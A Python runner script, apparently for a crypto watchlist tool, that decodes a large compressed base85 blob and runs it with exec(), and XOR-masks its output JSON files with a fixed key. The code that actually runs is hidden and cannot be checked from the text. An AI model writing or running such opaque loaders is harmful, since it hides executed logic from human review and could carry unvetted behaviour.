import base64, shutil, sys, zlib
from pathlib import Path

REQ = "requests==2.34.2\n"
KEY = bytes([0x5e,0x21,0xa9,0x8c,0x0f,0x73,0xd4,0xb6,0x11,0xc2,0xee,0x9a,0x48,0x73,0x5f,0xd0])
SOURCE = 'c-plaYjfK+^1FTo%YG=C(zN6_ZK|s><7=GOGpXZAoX)g54TqK>i#0{EeArff`tP^900@8&Np5?-Ya|l8i^XE!fWG|VxGM7Fn<zPE$-R|r%2k@Y9N4z~X})5MDrO679p-neJX(ZhXk~diXGIYux7P3JjSp~xWuC6BAXrvqm9rqQqIH($r4=SgT83qmCdFVN-{rSim={bw|6Zht{9Z<D#%aydWM1VtOG=*;EhNqBRnEf2Rhq`<k8EC*Y3^BJ5zNzd7PFEqI6g4SkebAj&mPUOU~w7puYabAm@*5?RUF+&j4OEL1LY>ewTky=$%em1%qUr=a^N?3zJTX?r8)bfVnqo{|K<GSr;87l*2J<$KK#!fT>ctd{|3(z$+6GYERW{l@g;i*eogZ`+Z}xPd<`JTh-0T!nN=mce1GxFd2n@h{Syo!z_De|^G#N!!9!TiVFg7Q#L+$TQLy&l-NohE`@QfWouU*NgC9OzzPtDlz@G*d{Mmn0X~}}HC|GHaE&KDQx7W7EhhUq^Je-#S$cPm%`ea|7f4n-s{(Sb{_ALAQ<JsGbcNc+rxfPiAX<V&YaB{i|)=?5v#R9NL!(lMw|M^1!7~bCo0(dlBXuu~OzyJv97DweK7(EbdHb<tvQREi+=u{hdRgd61SPF<Ps1o=WbQCd%a{Mli5(c7OM<vZJ(Za{z0rm^v;q`0rwm<_(lORvyI0ah4Dy{OMD(8s$vPMOt3ec#6o3J1OPHBjSS7n(M<KyFHm_<HVXPC^H4|*<yZ@?f(7G+`Nr}?b_n0bTkVDQuV*;`OQwVj^}mLHwnf@$Gy{+#|9#c_BHa*&&PHlMSM2E#0iK_}6Gk5M_il0BBkSsX@*_u}}4O%n_jY$<g;Kq!aE2nmd9Gw?t0H++^VkH=O~=KSde{{Y7ju8Xm?i00)K2hrMQ)_<)_FcVk-esIXJEZI6M0X9lX7&+yy(W1dp#?~@ULwrAajr;3bM{khSn1JH20EqKPTqW>hk|zl858<YOH_iyqtrP#1hl=9T;4;nS^f0-VhsiB-BtP!B-kUPts0aMZfuN9zf6Gb-MBs@fPxyytt-!Z|CQZbyd2&S)@#z{ABM`h_fQPNn0WO&J1|%^Yn$yzMVN@{dW0fG8^E^*;XKDX*eSKv;83eYrIYG|A_re;<H8^UFk?=Gbh6TPeCq_BLk{h!=!LqmDD9~d#faCf>kc42}0ltM7O&(y8Qrur#BkOy$_pN2(Jbn=~mN|S2r(o1_Z#*kziFgkRVU64wpQuAPpnDFo@8ayV4i*DU&ArfRYZ*om9f4tP1@l#!7Az2UjVA5%ngQu#SwYa^nr`a+Y+UOal0ik|Zh6|_HD)`ME(<qc3Jcf=!$bvJ9xe%qY{|<U-;a)A2Ue)k7?s*P0rA|5AoPRIfH!gkb<VwO0k_=%r0;gIS>L2_VY{#u5O&;y^wh2r_L#9bgmz2k%_>%5#=7+tSLDg1_bRP9J%+L<saT&%*m??7fH$8rt4hLq(17qJX0;Az@e1M;#w>>-2e>L+^pyUgEhY^hN5wfoRRay>&@L$YNV8<l(Jx_KNq!Or5_vNj4I#OS;tebsA`lk`euW+9l%_{OXExBpQ&ek*=5_9-r@+PwOFq4VC)Bw+R5+yKLcTD9_$n4>##e}-e|c@+9<a1;+bg>dV>ua7pTRPxv)WdOZ@KJm$C_cRqT3ayUHSkBa<wNj&_wz0a;8)Xxkbo{)$pZlR{vyqiolv8B9A_VPL?bj2j>N60}v?6@TPF+>kG_vWJJ-n1#uA&g+<?`R#DpWcLY8<Jw%yK_bbz>P^MxX2DG|~p-?BCDs&1eB$4<g=r}KT;>=@ks%qOLA2ZZlxmE#VY*^1`5vXlQ-l^AeBsoM5I8m`xVk4FelIDOj;h>-4S&YSfn|Pokky4YUmv8KvP|z=1(E)rYxl(X)IqXb0&(or?c%EsMR00*gbq1Nr0uwX<5guL8%MdIq?!X<T(V{?BSPo2;koKXgOTeK5^ic+N)UiOdFcDxNHmL4=qVo`ys}^gHi_xC563FmY3!U8Kq$3}ce<q@5jJ1Lhm$U6PLK>w^Pa>W`qRPKOy+O+ayTRmjw7?2P=IiviRfKBIX#_0fzZIUk!odv$Rbmg;T4Ye+Hgrnzgan1|6!S0%Qk*48AFvo0*L5lBiJ1b7^)y<ERNDt(o*3(7WDKYxo$Sa&z@tzCO_h$GYBv%PEEu-6V~rq%LgO^%F{8Q%j#!gfTeL_+WC}Y%ufRoML7&o7+qJ%!h=TI+NBcPhWRZHk!F+*prP8TJ2|IfZWvYzNs4yn>Bu%|y-bav&52UTFnCrC>kA#0QXz@M7J#+Z5I}>#H9y8Qb87cru3zi~0a0(b6>g=+k3f7juNy_MEb4W`<S~m=xJJ5*M)!G)SRz`EIjt@^kIl}SD=_<GT>{Jjv$W%G31srE7mW$j%!DnizrJhZ4crc!<u9|75K+dJPL+;or>v6ObQZ2!op)(riGFuLlh1H;k*j%QByyXJC1t)QGD)zCrWDu#$tdSB)KeT4xm}~MrYDwYf<ti7_L|Z-aCN!&Q*Bok(ZnvtDKkn-|&IxFC^a~};Ak${T?x5k)R(e`AKfs5;Y;TlNc66K?w#nsOr*69BJRs%@eddiI^y|9&Y({qFKRLWKMuj0PQb19xZ8tX^t-mx;C7|j#%_tmW99N5xEmK{4DRKgoUsN{`3LQO>@kA7nE0*)<EidrxV%!Ybnu-PRe^fCp#~N&FSP1Y&YN)kr9l>v7OKZ<4hNtj3Gay>}CD1&Xh5&{Sm{nXlZVOQD;}mdkD=1d$AP4n1ntMFuj3YsCZ9DoL)A7sUaK@D?PamYGZU<uNw3DJ*E~9w_NnEE_Z`wO*t=bU9HQ#la)RPEy*}5n>_S##2!O`Si+E{bK!@LNT*iiLO`b%w-Ab^ap;^-@0O=zgJkaVNodS>hE@2EqkESg)wMewG!)SfQ+0oe>v;}UwKyULC>`hmnyfSTJi8}5BHRQv`zklJB7FO}|t82R_Df7PfBY{=ynQF419u?K?u_r>Me<qzlMPK>RqjL$F99Cn*+CULmFS%g+Tw(_Z*R8^XW5%%OojiN?Ju~uNVDQL9ygyy0Txm#hp#lI}OL81uJS5BV3^1kwaha|>9ZozXJ_|x%dICHmlyT~y@kV<HXD4t5egq&=%91~KTJgp&H3vb!h?)Clx0{x9(PM=jK9Khu3S%bm70t8={M{}d=3IRcgP@l!!9@9JS@D33u|1@OAj{u_ZHc1P}Qp_;gYQKV(QSej{jr1AfTt#OsTEeYCi*!o|QW=;I$k${5ie+j*To^?)#}iruR=N5%JPEG@S_riVo{P>nv%<fwx||T;h18<IuS6%Br<`dF>IM-ATQgQ>Sj;}edWqfU226N*qAp5*O<Rijimk%{6#-%ewI%9<HUh}2B!RtF0OG7z0}%x<;QsL8=d1VU*XOqMwOlOxaKgSi`*?kU=dPO0Fd&ZYp&%^9>7!^p_+cTBza9C-hxe`@6)Eh<8d7v!Jj*BvV?&VWG<68h3k>ov+K6UL_E@(pT@FAE2Jxd7scM=)4hP`~g#L`q3D5g>A13N&i9wv+?#sZmv%eroJ$_I~eUSu0FG|{RhWyBI$d3#$%@6Z(GBR5uglNXX=HZpQ<0O%mhE3FFN9mb)N=@jgmC^21-Djw9hbq52yLf;8wu{_9rn5b|JM4g{b$7ZuMVoctn%e!e?UE2z?r8&Exj{_@dy*dk0aP^o8*~eo@2c57YrvW!iNLUQBz@GghIFtuY?7#Dh9+a6ixEPb&YF0pymUN$gphS%ZjG{}Yl+zYS1!_2^c$$F@3^%W1*6M3r1_%FUi$+6dTN6w2lp>enr(Ce6u#9yxdyy8K)~9w9vL{e^laje2zs&ruN0w<J5BYcBL#AD@W~goD0!_){?A8DrT<NIx7TPmDR5svtMrkaQ|F8D0xzuSd3^tkmYLrD-&kKy)Ez4aUKHT_bQ!=a-Cl(-@T8XREjb+yT{!Kr-V3bnLHX<v6wv5piJ9tMH5{lI#2%!Nvlfmbh256`FS$4@nWtDtOzf&$9=(=rss1x$eNMh4RDcbpfvVX_d#!e~J8b=5atLjHOlP!54XVl(rsGu?ZfKm}6ARYqg7pqkNUB{?4-C&wmsQNc`{pCrbvbUCV|NY7^9a-5+BA{K>zZRa>narVLG(L(1FYdfY9?i3lb`{_(Vvjqq5^}iIr2+S(sH0>)Kq%yfgkiubQ_?ri)x(}H5WqV3E0ol%z-*=eFI9iin1WDATRbfTXJ$;f9?~Tl6aa4JKas?lIJi4q1B}LIBf#Y`W>Feo;khi9+WTC%=hbNdo8>5xMyj3Nax;)-<>nMO_A)LbBBar-or#effbmfa-vq2dCX9oA%$r)8uNL*$Y-7e0&3&R5WF!@LiY5Ua=Js%*B}CFs&limK~&GHzb3Bq))A2Vij(_lwrzHtXczQMO07kWU>4O(goF=+<Q97fX&Ng`ZAeEmJLze>@T`PA;4YXQ6U^Xp(3L+ba4^fLHVMz_8bI}F@P@kCjo*IXKzExrW=QG9!hl;6u6%|iv~M(q4;>f7(uXM^{}WnX(^iTtb8h&q`MhbZ&^WE=04OBS(wc>jW9zZmEEK`Uv>JJkuA7Y>nf}33bS`>ztlTQBXe)Zg4G$!k>nTk{I-m&Ai>9`Bly(2Ozv?T9+Ls9$kV>I-L)H)a&GFu%s1@{0I*s82Yb%A{TUl*Qz11}el~;V99=$w~x3@TCBXvYrkvtlASrAyHEo+wFGLhBp$yYq;PmEjV)Tkf3lVCkRRkx-al@b!4w)JWzGj+}zpzp}E+^)n4r7OP+wb9dOy6Ryh^k%4r8T(Ry!5Zjm2acF=@QnTG&zAaxGiYZNWUh#VUpmJ1j9!v9t*H-5s4G>^sK^Slp~!s%^i<oNx}#UnN2H^cr!Za9>b1&#n`*m4=?3v*cL%m_Yr0y#ZCPtj-Cj$f>}%t6d#eNF($)3dy}_dN+3lq|-wU55?X)crx);{b_Az}IMM(aOveu;@OfFRHrY5wJXkoIsBh&4<=L1;!O&@sdxZS00*ojHxuiozQqKnzoKrXe!5GD351XnU>rQ~V{vGLeQDe7w#bZ<=0l-)*pEqUp=8bBNuTK%~zId3HB{J5tL@mI2Qene?^Hhw#k-9t=JE9w6>38O+7bpRNZz;#}+zCN+0#oDz3U0==EQtM6kD)t5ngNC*Y=|h!LH%cA+sZN_hLwj+hgMImS!yfi#-7+L<ts~jJZO&pK7#*dVxS&2FvwEzpUuO|4;IX4x8$7FI-zoi$?CT+iWH8`A1}z*~<c|D`4xhkDs$@$U>xa+R{`zha<xUo&go_C&9#2Dp^o}0+YE*xePfra}tzkrL0A^C)uYbd09z_%KOdbes0kkJ4s1Wvlu!3wgR;6c0uBnBe<&59aC%?&8(AV3i5ZBwuBF3}}g#<n2aS_tNh0?-4h~Q?U@*~Ar4X=J)+anvI^w(u0a&D;WaNC!VL~fi#**N`-<V_UWVHe%|7uGjJpbd|lK>b_IB8@>`!>UYaaXp8spfg5$5g;g;-hCFwLD!g08eG?7u+^_6YbUR)?<WWi|9(d=Tk%``TKOnvOJICubBB>^x>=#$Rr7h0HV?^0<@+1|fw4P$>*6uTtNv~&Kz}D0enku?#PDb+-@fc%dmToJE%8Su67+Pa5qK%zj@r|69aI!vbyE0d7X?#Y+XocLqGM_h{WPC0z=@yf`)B!WwFW)Cq7l(P;b4Ba0FNccRR_vGIwF%%L2SNCBk+I|@UozD*hX512?Qhj*4SQ8NY0Z2@U(Sk!4>!qtGJv9iUW0<2pGanrC^ahkjX-@E|f-ZB*Ci=9p?V1-&&~sfQ0?pa}h7R9Z?S$?yZ$BWjTgXJ4uhyOl!D^y&8(>2th&~_P1_A2!l)bk3{t9Tsu<Zl{k+K9HAqS@L`YVg{?GOxKYlq=HT{LK!?>bBF@)oQg;>O_8)1{61uAO-t#04LmzPakC`+KV`OJd)mu+>mQn2rs`nyIPcbY?tvxZvIFcRqR8~gN<$8Srz5{^e%?JVs0yNnm5OJCR1mn}DfOVcfMy133j63)ryN}DN'
FILES = {"0": "crypto_watchlist_live.json", "1": "crypto_watchlist_latest.json"}
MODES = {
    "0": "auto",
    "1": "manual",
    "2": "crypto-refresh",
    "3": "main",
    "4": "final",
    "5": "preclose",
    "8": "auto",
}

def _encode(raw: bytes) -> bytes:
    compressed = zlib.compress(raw, 9)
    masked = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(compressed))
    return base64.b85encode(masked)

def _decode(raw: bytes) -> bytes:
    masked = base64.b85decode(raw.strip())
    compressed = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(masked))
    return zlib.decompress(compressed)

def _restore() -> None:
    shutil.rmtree("output", ignore_errors=True)
    out = Path("output")
    out.mkdir(parents=True, exist_ok=True)
    for slot, name in FILES.items():
        src = Path("o") / slot
        if src.exists():
            (out / name).write_bytes(_decode(src.read_bytes()))

def _persist() -> None:
    target = Path("o")
    target.mkdir(parents=True, exist_ok=True)
    for slot, name in FILES.items():
        src = Path("output") / name
        if src.exists():
            (target / slot).write_bytes(_encode(src.read_bytes()))

def _run(mode: str) -> int:
    _restore()
    old_argv = sys.argv[:]
    code = 0
    try:
        sys.argv = ["runner2", "--mode", mode]
        source = zlib.decompress(base64.b85decode(SOURCE)).decode("utf-8")
        ns = {"__name__": "__main__", "__file__": "<runner2>"}
        try:
            exec(compile(source, "<runner2>", "exec"), ns, ns)
        except SystemExit as exc:
            code = int(exc.code or 0)
    finally:
        sys.argv = old_argv
        _persist()
        shutil.rmtree("output", ignore_errors=True)
    return code

def main() -> int:
    arg = sys.argv[1] if len(sys.argv) > 1 else "8"
    if arg == "7":
        sys.stdout.write(REQ)
        return 0
    mode = MODES.get(arg)
    if mode is None:
        print(f"unsupported mode: {arg}", file=sys.stderr)
        return 2
    return _run(mode)

if __name__ == "__main__":
    raise SystemExit(main())
